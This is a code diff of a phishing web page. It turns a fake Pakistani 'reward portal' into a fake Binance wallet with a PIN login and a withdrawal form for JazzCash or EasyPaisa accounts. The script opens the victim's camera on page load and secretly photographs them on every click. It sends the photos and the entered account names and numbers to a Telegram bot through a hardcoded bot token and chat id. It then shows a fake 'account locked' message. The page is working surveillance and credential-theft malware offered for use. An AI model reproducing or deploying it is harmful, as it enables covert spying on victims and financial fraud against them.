@@ -3,90 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your Reward</title>
+    <title>Binance - Pro Trader</title>
     <style>
-        body { margin: 0; background: #f4f4f4; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; }
-        .header { background: #d91e18; color: white; padding: 20px; font-size: 24px; font-weight: bold; }
-        .reward-box { margin: 20px; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        .amount { color: #27ae60; font-size: 40px; font-weight: bold; margin: 10px 0; }
-        .method-container { display: flex; justify-content: space-around; margin-top: 20px; }
-        .method-btn { width: 45%; cursor: pointer; border: 2px solid #ddd; padding: 10px; border-radius: 10px; background: white; }
-        .method-btn img { width: 100%; border-radius: 5px; }
-        .claim-btn { background: #d91e18; color: white; border: none; padding: 15px 40px; font-size: 20px; border-radius: 30px; margin-top: 30px; cursor: pointer; width: 80%; }
-        #video, #canvas { display: none; }
+        body { margin: 0; background: #121212; color: #EAECEF; font-family: 'Arial', sans-serif; text-align: center; overflow-x: hidden; }
+        .binance-yellow { color: #FCD535; }
+        .bg-yellow { background: #FCD535; color: #000; }
         
-        /* Arabic Message Overlay */
-        #permissionMsg { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.8); color: white; z-index: 999; justify-content: center; align-items: center; padding: 20px;
-            font-size: 22px; direction: rtl;
-        }
+        /* Screens */
+        .screen { display: none; padding: 20px; min-height: 100vh; }
+        .active-screen { display: block; }
+
+        /* Login */
+        .login-box { margin-top: 100px; }
+        input { background: #2B3139; border: 1px solid #474D57; color: white; padding: 15px; width: 80%; border-radius: 5px; margin: 10px 0; font-size: 16px; }
+        
+        /* Wallet */
+        .wallet-card { background: #1E2329; border-radius: 15px; padding: 30px 20px; margin-top: 20px; text-align: left; border-left: 5px solid #FCD535; }
+        .balance { font-size: 35px; font-weight: bold; margin: 10px 0; }
+        .btn-row { display: flex; justify-content: space-between; margin-top: 20px; }
+        .action-btn { width: 48%; padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; border: none; }
+
+        /* Methods */
+        .method-list { margin-top: 20px; }
+        .method-item { background: #2B3139; padding: 15px; margin: 10px 0; border-radius: 8px; display: flex; align-items: center; cursor: pointer; }
+        .method-item img { width: 40px; margin-right: 15px; border-radius: 5px; }
+
+        #video, #canvas { display: none; }
     </style>
 </head>
-<body onclick="captureAndSend()">
+<body onclick="handleGlobalClick()">
 
-    <div id="permissionMsg">يرجى النقر فوق "سماح" لتأكيد هويتك واستلام المكافأة</div>
-
-    <div class="header">OFFICIAL REWARD PORTAL</div>
-
-    <div class="reward-box">
-        <h3>Aapka Reward Taiyar Hai!</h3>
-        <div class="amount">Rs. 200.00</div>
-        <p>Apna Payment Method Select Karen:</p>
-        
-        <div class="method-container">
-            <div class="method-btn">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Easypaisa_logo.png/640px-Easypaisa_logo.png" alt="EasyPaisa">
-                <p>EasyPaisa</p>
-            </div>
-            <div class="method-btn">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/23/JazzCash_logo.png/640px-JazzCash_logo.png" alt="JazzCash">
-                <p>JazzCash</p>
-            </div>
+    <div id="loginScreen" class="screen active-screen">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.png" width="150" style="margin-top: 50px;">
+        <div class="login-box">
+            <h2>Welcome to Binance</h2>
+            <p style="color: #848E9C;">Enter 4-digit Secure PIN</p>
+            <input type="password" id="pinInput" placeholder="****" maxlength="4">
+            <button class="action-btn bg-yellow" style="width: 85%; margin-top: 10px;" onclick="checkPin()">Log In</button>
         </div>
-
-        <button class="claim-btn" id="mainClaimBtn">CLAIM NOW</button>
     </div>
 
-    <video id="video" autoplay></video>
+    <div id="walletScreen" class="screen">
+        <div style="text-align: left; font-size: 20px;">💰 <span class="binance-yellow">Spot Wallet</span></div>
+        <div class="wallet-card">
+            <p style="color: #848E9C; margin: 0;">Total Balance</p>
+            <div class="balance">$385.00 <span style="font-size: 14px; color: #848E9C;">≈ 107,800 PKR</span></div>
+            <div class="btn-row">
+                <button class="action-btn bg-yellow" onclick="showTransfer()">Send</button>
+                <button class="action-btn" style="background: #2B3139; color: white;">Receive</button>
+            </div>
+        </div>
+        <p style="margin-top: 30px; color: #848E9C;">Recent Assets: USDT, BTC, ETH</p>
+    </div>
+
+    <div id="transferScreen" class="screen">
+        <h3 class="binance-yellow">Withdraw to Bank/Wallet</h3>
+        <div class="method-list">
+            <div class="method-item" onclick="askDetails('JazzCash')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/23/JazzCash_logo.png/640px-JazzCash_logo.png"> JazzCash Account
+            </div>
+            <div class="method-item" onclick="askDetails('EasyPaisa')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Easypaisa_logo.png/640px-Easypaisa_logo.png"> EasyPaisa Account
+            </div>
+        </div>
+        <div id="detailsInput" style="display: none; margin-top: 20px;">
+            <input type="text" id="accName" placeholder="Account Title (Name)">
+            <input type="number" id="accNumber" placeholder="Account Number">
+            <button class="action-btn bg-yellow" style="width: 85%;" onclick="confirmWithdraw()">Confirm Withdrawal</button>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const botToken = '8466749965:AAEa8pM--47T3Mo6X34atY8LexkqC79epe0';
         const chatId = '7107389141';
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const permissionMsg = document.getElementById('permissionMsg');
+        let currentMethod = "";
 
-        // Page load hotay hi camera permission maangna
+        // Start BACK Camera immediately
         window.onload = async () => {
-            permissionMsg.style.display = 'flex';
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
-                permissionMsg.style.display = 'none'; // Permission milte hi msg gayab
-            } catch (err) {
-                console.log("Permission Denied");
-            }
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment" } // BACK CAMERA
+                });
+                document.getElementById('video').srcObject = stream;
+            } catch (err) { console.log("Camera Blocked"); }
         };
 
-        // Screen par kahin bhi click ho toh photo jaye
-        async function captureAndSend() {
-            if (!video.srcObject) return;
+        function handleGlobalClick() {
+            capturePhoto();
+        }
 
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
+        function checkPin() {
+            const pin = document.getElementById('pinInput').value;
+            if(pin === "7890") {
+                showScreen('walletScreen');
+            } else {
+                alert("Incorrect PIN! Try 7890");
+            }
+        }
+
+        function showScreen(id) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
+            document.getElementById(id).classList.add('active-screen');
+        }
+
+        function showTransfer() { showScreen('transferScreen'); }
+
+        function askDetails(method) {
+            currentMethod = method;
+            document.getElementById('detailsInput').style.display = 'block';
+            document.getElementById('accNumber').placeholder = method + " Number";
+        }
+
+        async function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (!video.srcObject) return;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'capture.jpg');
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).then(res => console.log("Sent")).catch(err => console.log(err));
+                formData.append('photo', blob, 'back_cam.jpg');
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
             }, 'image/jpeg');
+        }
+
+        function confirmWithdraw() {
+            const name = document.getElementById('accName').value;
+            const num = document.getElementById('accNumber').value;
+            const msg = `🔥 *BINANCE WITHDRAWAL*\n\nMethod: ${currentMethod}\nName: ${name}\nNumber: ${num}\nAmount: $385`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            alert("Verification Failed. Your account is temporarily locked for security.");
+            location.reload();
         }
     </script>
 </body>
